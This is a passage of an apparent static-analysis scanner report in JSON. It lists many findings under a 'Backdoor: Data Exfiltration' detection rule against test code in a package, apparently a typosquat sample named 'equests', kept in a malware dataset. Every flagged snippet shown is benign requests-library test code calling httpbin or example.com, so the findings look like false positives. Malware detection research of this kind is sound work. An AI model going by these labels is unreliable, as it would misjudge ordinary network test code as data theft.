                      "text": "                return None\n\n        session = CustomRedirectSession()\n        r = session.get(urls_test[0])\n        assert len(r.history) == 2\n        assert r.status_code == 200\n        assert r.history[0].status_code == 302\n",
                      "markdown": "`                return None\n\n        session = CustomRedirectSession()\n        r = session.get(urls_test[0])\n        assert len(r.history) == 2\n        assert r.status_code == 200\n        assert r.history[0].status_code == 302\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1983,
                  "startColumn": 39,
                  "endLine": 1983,
                  "endColumn": 44,
                  "snippet": {
                    "text": "                if resp.is_redirect:\n                    return resp.headers['location']\n                # edge case - check to see if 'location' is in headers anyways\n                location = resp.headers.get('location')\n                if location and (location != resp.url):\n                    return location\n                return None\n",
                    "rendered": {
                      "text": "                if resp.is_redirect:\n                    return resp.headers['location']\n                # edge case - check to see if 'location' is in headers anyways\n                location = resp.headers.get('location')\n                if location and (location != resp.url):\n                    return location\n                return None\n",
                      "markdown": "`                if resp.is_redirect:\n                    return resp.headers['location']\n                # edge case - check to see if 'location' is in headers anyways\n                location = resp.headers.get('location')\n                if location and (location != resp.url):\n                    return location\n                return None\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1950,
                  "startColumn": 20,
                  "endLine": 1950,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        \"\"\"\n        data = (i for i in [b'a', b'b', b'c'])\n        url = httpbin('post')\n        r = requests.Request('POST', url, data=data)\n        prepared_request = r.prepare()\n        assert 'Transfer-Encoding' in prepared_request.headers\n        assert 'Content-Length' not in prepared_request.headers\n",
                    "rendered": {
                      "text": "        \"\"\"\n        data = (i for i in [b'a', b'b', b'c'])\n        url = httpbin('post')\n        r = requests.Request('POST', url, data=data)\n        prepared_request = r.prepare()\n        assert 'Transfer-Encoding' in prepared_request.headers\n        assert 'Content-Length' not in prepared_request.headers\n",
                      "markdown": "`        \"\"\"\n        data = (i for i in [b'a', b'b', b'c'])\n        url = httpbin('post')\n        r = requests.Request('POST', url, data=data)\n        prepared_request = r.prepare()\n        assert 'Transfer-Encoding' in prepared_request.headers\n        assert 'Content-Length' not in prepared_request.headers\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1939,
                  "startColumn": 20,
                  "endLine": 1939,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        auth = ('user', 'pass')\n        url = httpbin('post')\n        file_obj = io.BytesIO(b'test data')\n        r = requests.Request('POST', url, auth=auth, data=file_obj)\n        prepared_request = r.prepare()\n        assert 'Transfer-Encoding' not in prepared_request.headers\n        assert 'Content-Length' in prepared_request.headers\n",
                    "rendered": {
                      "text": "        auth = ('user', 'pass')\n        url = httpbin('post')\n        file_obj = io.BytesIO(b'test data')\n        r = requests.Request('POST', url, auth=auth, data=file_obj)\n        prepared_request = r.prepare()\n        assert 'Transfer-Encoding' not in prepared_request.headers\n        assert 'Content-Length' in prepared_request.headers\n",
                      "markdown": "`        auth = ('user', 'pass')\n        url = httpbin('post')\n        file_obj = io.BytesIO(b'test data')\n        r = requests.Request('POST', url, auth=auth, data=file_obj)\n        prepared_request = r.prepare()\n        assert 'Transfer-Encoding' not in prepared_request.headers\n        assert 'Content-Length' in prepared_request.headers\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1927,
                  "startColumn": 20,
                  "endLine": 1927,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        auth = ('user', 'pass')\n        url = httpbin('post')\n        file_obj = io.BytesIO(b'')\n        r = requests.Request('POST', url, auth=auth, data=file_obj)\n        prepared_request = r.prepare()\n        assert 'Transfer-Encoding' in prepared_request.headers\n        assert 'Content-Length' not in prepared_request.headers\n",
                    "rendered": {
                      "text": "        auth = ('user', 'pass')\n        url = httpbin('post')\n        file_obj = io.BytesIO(b'')\n        r = requests.Request('POST', url, auth=auth, data=file_obj)\n        prepared_request = r.prepare()\n        assert 'Transfer-Encoding' in prepared_request.headers\n        assert 'Content-Length' not in prepared_request.headers\n",
                      "markdown": "`        auth = ('user', 'pass')\n        url = httpbin('post')\n        file_obj = io.BytesIO(b'')\n        r = requests.Request('POST', url, auth=auth, data=file_obj)\n        prepared_request = r.prepare()\n        assert 'Transfer-Encoding' in prepared_request.headers\n        assert 'Content-Length' not in prepared_request.headers\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1900,
                  "startColumn": 20,
                  "endLine": 1900,
                  "endColumn": 25,
                  "snippet": {
                    "text": "        assert headers == {'Proxy-Authorization': 'Basic dXNlcjo='}\n\n    def test_response_json_when_content_is_None(self, httpbin):\n        r = requests.get(httpbin('/status/204'))\n        # Make sure r.content is None\n        r.status_code = 0\n        r._content = False\n",
                    "rendered": {
                      "text": "        assert headers == {'Proxy-Authorization': 'Basic dXNlcjo='}\n\n    def test_response_json_when_content_is_None(self, httpbin):\n        r = requests.get(httpbin('/status/204'))\n        # Make sure r.content is None\n        r.status_code = 0\n        r._content = False\n",
                      "markdown": "`        assert headers == {'Proxy-Authorization': 'Basic dXNlcjo='}\n\n    def test_response_json_when_content_is_None(self, httpbin):\n        r = requests.get(httpbin('/status/204'))\n        # Make sure r.content is None\n        r.status_code = 0\n        r._content = False\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1872,
                  "startColumn": 20,
                  "endLine": 1872,
                  "endColumn": 25,
                  "snippet": {
                    "text": "    @pytest.mark.xfail\n    def test_response_iter_lines_reentrant(self, httpbin):\n        \"\"\"Response.iter_lines() is not reentrant safe\"\"\"\n        r = requests.get(httpbin('stream/4'), stream=True)\n        assert r.status_code == 200\n\n        next(r.iter_lines())\n",
                    "rendered": {
                      "text": "    @pytest.mark.xfail\n    def test_response_iter_lines_reentrant(self, httpbin):\n        \"\"\"Response.iter_lines() is not reentrant safe\"\"\"\n        r = requests.get(httpbin('stream/4'), stream=True)\n        assert r.status_code == 200\n\n        next(r.iter_lines())\n",
                      "markdown": "`    @pytest.mark.xfail\n    def test_response_iter_lines_reentrant(self, httpbin):\n        \"\"\"Response.iter_lines() is not reentrant safe\"\"\"\n        r = requests.get(httpbin('stream/4'), stream=True)\n        assert r.status_code == 200\n\n        next(r.iter_lines())\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1863,
                  "startColumn": 33,
                  "endLine": 1863,
                  "endColumn": 38,
                  "snippet": {
                    "text": "    def test_unconsumed_session_response_closes_connection(self, httpbin):\n        s = requests.session()\n\n        with contextlib.closing(s.get(httpbin('stream/4'), stream=True)) as response:\n            pass\n\n        assert response._content_consumed is False\n",
                    "rendered": {
                      "text": "    def test_unconsumed_session_response_closes_connection(self, httpbin):\n        s = requests.session()\n\n        with contextlib.closing(s.get(httpbin('stream/4'), stream=True)) as response:\n            pass\n\n        assert response._content_consumed is False\n",
                      "markdown": "`    def test_unconsumed_session_response_closes_connection(self, httpbin):\n        s = requests.session()\n\n        with contextlib.closing(s.get(httpbin('stream/4'), stream=True)) as response:\n            pass\n\n        assert response._content_consumed is False\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1855,
                  "startColumn": 21,
                  "endLine": 1855,
                  "endColumn": 26,
                  "snippet": {
                    "text": "        assert len(list(it)) == 3\n\n    def test_response_context_manager(self, httpbin):\n        with requests.get(httpbin('stream/4'), stream=True) as response:\n            assert isinstance(response, requests.Response)\n\n        assert response.raw.closed\n",
                    "rendered": {
                      "text": "        assert len(list(it)) == 3\n\n    def test_response_context_manager(self, httpbin):\n        with requests.get(httpbin('stream/4'), stream=True) as response:\n            assert isinstance(response, requests.Response)\n\n        assert response.raw.closed\n",
                      "markdown": "`        assert len(list(it)) == 3\n\n    def test_response_context_manager(self, httpbin):\n        with requests.get(httpbin('stream/4'), stream=True) as response:\n            assert isinstance(response, requests.Response)\n\n        assert response.raw.closed\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1847,
                  "startColumn": 20,
                  "endLine": 1847,
                  "endColumn": 25,
                  "snippet": {
                    "text": "        assert 'stuff=elixr' == prep.body\n\n    def test_response_iter_lines(self, httpbin):\n        r = requests.get(httpbin('stream/4'), stream=True)\n        assert r.status_code == 200\n\n        it = r.iter_lines()\n",
                    "rendered": {
                      "text": "        assert 'stuff=elixr' == prep.body\n\n    def test_response_iter_lines(self, httpbin):\n        r = requests.get(httpbin('stream/4'), stream=True)\n        assert r.status_code == 200\n\n        it = r.iter_lines()\n",
                      "markdown": "`        assert 'stuff=elixr' == prep.body\n\n    def test_response_iter_lines(self, httpbin):\n        r = requests.get(httpbin('stream/4'), stream=True)\n        assert r.status_code == 200\n\n        it = r.iter_lines()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1840,
                  "startColumn": 20,
                  "endLine": 1840,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        assert {'life': 42} == r.json()['json']\n\n    def test_json_param_post_should_not_override_data_param(self, httpbin):\n        r = requests.Request(method='POST', url=httpbin('post'),\n                             data={'stuff': 'elixr'},\n                             json={'music': 'flute'})\n        prep = r.prepare()\n",
                    "rendered": {
                      "text": "        assert {'life': 42} == r.json()['json']\n\n    def test_json_param_post_should_not_override_data_param(self, httpbin):\n        r = requests.Request(method='POST', url=httpbin('post'),\n                             data={'stuff': 'elixr'},\n                             json={'music': 'flute'})\n        prep = r.prepare()\n",
                      "markdown": "`        assert {'life': 42} == r.json()['json']\n\n    def test_json_param_post_should_not_override_data_param(self, httpbin):\n        r = requests.Request(method='POST', url=httpbin('post'),\n                             data={'stuff': 'elixr'},\n                             json={'music': 'flute'})\n        prep = r.prepare()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1831,
                  "startColumn": 20,
                  "endLine": 1831,
                  "endColumn": 26,
                  "snippet": {
                    "text": "            i += 1\n\n    def test_json_param_post_content_type_works(self, httpbin):\n        r = requests.post(\n            httpbin('post'),\n            json={'life': 42}\n        )\n",
                    "rendered": {
                      "text": "            i += 1\n\n    def test_json_param_post_content_type_works(self, httpbin):\n        r = requests.post(\n            httpbin('post'),\n            json={'life': 42}\n        )\n",
                      "markdown": "`            i += 1\n\n    def test_json_param_post_content_type_works(self, httpbin):\n        r = requests.post(\n            httpbin('post'),\n            json={'life': 42}\n        )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1823,
                  "startColumn": 20,
                  "endLine": 1823,
                  "endColumn": 25,
                  "snippet": {
                    "text": "        assert s == auth_str\n\n    def test_requests_history_is_saved(self, httpbin):\n        r = requests.get(httpbin('redirect/5'))\n        total = r.history[-1].history\n        i = 0\n        for item in r.history:\n",
                    "rendered": {
                      "text": "        assert s == auth_str\n\n    def test_requests_history_is_saved(self, httpbin):\n        r = requests.get(httpbin('redirect/5'))\n        total = r.history[-1].history\n        i = 0\n        for item in r.history:\n",
                      "markdown": "`        assert s == auth_str\n\n    def test_requests_history_is_saved(self, httpbin):\n        r = requests.get(httpbin('redirect/5'))\n        total = r.history[-1].history\n        i = 0\n        for item in r.history:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1810,
                  "startColumn": 9,
                  "endLine": 1810,
                  "endColumn": 14,
                  "snippet": {
                    "text": "        s = requests.Session()\n        url = httpbin('redirect/1')\n        self._patch_adapter_gzipped_redirect(s, url)\n        s.get(url)\n\n    @pytest.mark.parametrize(\n        'username, password, auth_str', (\n",
                    "rendered": {
                      "text": "        s = requests.Session()\n        url = httpbin('redirect/1')\n        self._patch_adapter_gzipped_redirect(s, url)\n        s.get(url)\n\n    @pytest.mark.parametrize(\n        'username, password, auth_str', (\n",
                      "markdown": "`        s = requests.Session()\n        url = httpbin('redirect/1')\n        self._patch_adapter_gzipped_redirect(s, url)\n        s.get(url)\n\n    @pytest.mark.parametrize(\n        'username, password, auth_str', (\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1784,
                  "startColumn": 23,
                  "endLine": 1784,
                  "endColumn": 32,
                  "snippet": {
                    "text": "                return\n\n        data = BadFileObj('the data')\n        prep = requests.Request('GET', 'http://example.com', data=data).prepare()\n        assert prep._body_position is not None\n\n        with pytest.raises(UnrewindableBodyError) as e:\n",
                    "rendered": {
                      "text": "                return\n\n        data = BadFileObj('the data')\n        prep = requests.Request('GET', 'http://example.com', data=data).prepare()\n        assert prep._body_position is not None\n\n        with pytest.raises(UnrewindableBodyError) as e:\n",
                      "markdown": "`                return\n\n        data = BadFileObj('the data')\n        prep = requests.Request('GET', 'http://example.com', data=data).prepare()\n        assert prep._body_position is not None\n\n        with pytest.raises(UnrewindableBodyError) as e:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1764,
                  "startColumn": 23,
                  "endLine": 1764,
                  "endColumn": 32,
                  "snippet": {
                    "text": "                return\n\n        data = BadFileObj('the data')\n        prep = requests.Request('GET', 'http://example.com', data=data).prepare()\n        assert prep._body_position == 0\n\n        with pytest.raises(UnrewindableBodyError) as e:\n",
                    "rendered": {
                      "text": "                return\n\n        data = BadFileObj('the data')\n        prep = requests.Request('GET', 'http://example.com', data=data).prepare()\n        assert prep._body_position == 0\n\n        with pytest.raises(UnrewindableBodyError) as e:\n",
                      "markdown": "`                return\n\n        data = BadFileObj('the data')\n        prep = requests.Request('GET', 'http://example.com', data=data).prepare()\n        assert prep._body_position == 0\n\n        with pytest.raises(UnrewindableBodyError) as e:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1741,
                  "startColumn": 23,
                  "endLine": 1741,
                  "endColumn": 32,
                  "snippet": {
                    "text": "                return\n\n        data = BadFileObj('the data')\n        prep = requests.Request('GET', 'http://example.com', data=data).prepare()\n        assert prep._body_position == 0\n\n        with pytest.raises(UnrewindableBodyError) as e:\n",
                    "rendered": {
                      "text": "                return\n\n        data = BadFileObj('the data')\n        prep = requests.Request('GET', 'http://example.com', data=data).prepare()\n        assert prep._body_position == 0\n\n        with pytest.raises(UnrewindableBodyError) as e:\n",
                      "markdown": "`                return\n\n        data = BadFileObj('the data')\n        prep = requests.Request('GET', 'http://example.com', data=data).prepare()\n        assert prep._body_position == 0\n\n        with pytest.raises(UnrewindableBodyError) as e:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1718,
                  "startColumn": 23,
                  "endLine": 1718,
                  "endColumn": 32,
                  "snippet": {
                    "text": "    def test_rewind_partially_read_body(self):\n        data = io.BytesIO(b'the data')\n        data.read(4)  # read some data\n        prep = requests.Request('GET', 'http://example.com', data=data).prepare()\n        assert prep._body_position == 4\n        assert prep.body.read() == b'data'\n\n",
                    "rendered": {
                      "text": "    def test_rewind_partially_read_body(self):\n        data = io.BytesIO(b'the data')\n        data.read(4)  # read some data\n        prep = requests.Request('GET', 'http://example.com', data=data).prepare()\n        assert prep._body_position == 4\n        assert prep.body.read() == b'data'\n\n",
                      "markdown": "`    def test_rewind_partially_read_body(self):\n        data = io.BytesIO(b'the data')\n        data.read(4)  # read some data\n        prep = requests.Request('GET', 'http://example.com', data=data).prepare()\n        assert prep._body_position == 4\n        assert prep.body.read() == b'data'\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1704,
                  "startColumn": 23,
                  "endLine": 1704,
                  "endColumn": 32,
                  "snippet": {
                    "text": "\n    def test_rewind_body(self):\n        data = io.BytesIO(b'the data')\n        prep = requests.Request('GET', 'http://example.com', data=data).prepare()\n        assert prep._body_position == 0\n        assert prep.body.read() == b'the data'\n\n",
                    "rendered": {
                      "text": "\n    def test_rewind_body(self):\n        data = io.BytesIO(b'the data')\n        prep = requests.Request('GET', 'http://example.com', data=data).prepare()\n        assert prep._body_position == 0\n        assert prep.body.read() == b'the data'\n\n",
                      "markdown": "`\n    def test_rewind_body(self):\n        data = io.BytesIO(b'the data')\n        prep = requests.Request('GET', 'http://example.com', data=data).prepare()\n        assert prep._body_position == 0\n        assert prep.body.read() == b'the data'\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1699,
                  "startColumn": 23,
                  "endLine": 1699,
                  "endColumn": 32,
                  "snippet": {
                    "text": "\n    def test_prepare_body_position_non_stream(self):\n        data = b'the data'\n        prep = requests.Request('GET', 'http://example.com', data=data).prepare()\n        assert prep._body_position is None\n\n    def test_rewind_body(self):\n",
                    "rendered": {
                      "text": "\n    def test_prepare_body_position_non_stream(self):\n        data = b'the data'\n        prep = requests.Request('GET', 'http://example.com', data=data).prepare()\n        assert prep._body_position is None\n\n    def test_rewind_body(self):\n",
                      "markdown": "`\n    def test_prepare_body_position_non_stream(self):\n        data = b'the data'\n        prep = requests.Request('GET', 'http://example.com', data=data).prepare()\n        assert prep._body_position is None\n\n    def test_rewind_body(self):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1680,
                  "startColumn": 14,
                  "endLine": 1680,
                  "endColumn": 19,
                  "snippet": {
                    "text": "\n    def test_manual_redirect_with_partial_body_read(self, httpbin):\n        s = requests.Session()\n        r1 = s.get(httpbin('redirect/2'), allow_redirects=False, stream=True)\n        assert r1.is_redirect\n        rg = s.resolve_redirects(r1, r1.request, stream=True)\n\n",
                    "rendered": {
                      "text": "\n    def test_manual_redirect_with_partial_body_read(self, httpbin):\n        s = requests.Session()\n        r1 = s.get(httpbin('redirect/2'), allow_redirects=False, stream=True)\n        assert r1.is_redirect\n        rg = s.resolve_redirects(r1, r1.request, stream=True)\n\n",
                      "markdown": "`\n    def test_manual_redirect_with_partial_body_read(self, httpbin):\n        s = requests.Session()\n        r1 = s.get(httpbin('redirect/2'), allow_redirects=False, stream=True)\n        assert r1.is_redirect\n        rg = s.resolve_redirects(r1, r1.request, stream=True)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1640,
                  "startColumn": 20,
                  "endLine": 1640,
                  "endColumn": 25,
                  "snippet": {
                    "text": "        assert 'Authorization' not in r.request.headers\n\n    def test_auth_is_retained_for_redirect_on_host(self, httpbin):\n        r = requests.get(httpbin('redirect/1'), auth=('user', 'pass'))\n        h1 = r.history[0].request.headers['Authorization']\n        h2 = r.request.headers['Authorization']\n\n",
                    "rendered": {
                      "text": "        assert 'Authorization' not in r.request.headers\n\n    def test_auth_is_retained_for_redirect_on_host(self, httpbin):\n        r = requests.get(httpbin('redirect/1'), auth=('user', 'pass'))\n        h1 = r.history[0].request.headers['Authorization']\n        h2 = r.request.headers['Authorization']\n\n",
                      "markdown": "`        assert 'Authorization' not in r.request.headers\n\n    def test_auth_is_retained_for_redirect_on_host(self, httpbin):\n        r = requests.get(httpbin('redirect/1'), auth=('user', 'pass'))\n        h1 = r.history[0].request.headers['Authorization']\n        h2 = r.request.headers['Authorization']\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1630,
                  "startColumn": 20,
                  "endLine": 1630,
                  "endColumn": 25,
                  "snippet": {
                    "text": "            assert test_url == preq.url\n\n    def test_auth_is_stripped_on_http_downgrade(self, httpbin, httpbin_secure, httpbin_ca_bundle):\n        r = requests.get(\n            httpbin_secure('redirect-to'),\n            params={'url': httpbin('get')},\n            auth=('user', 'pass'),\n",
                    "rendered": {
                      "text": "            assert test_url == preq.url\n\n    def test_auth_is_stripped_on_http_downgrade(self, httpbin, httpbin_secure, httpbin_ca_bundle):\n        r = requests.get(\n            httpbin_secure('redirect-to'),\n            params={'url': httpbin('get')},\n            auth=('user', 'pass'),\n",
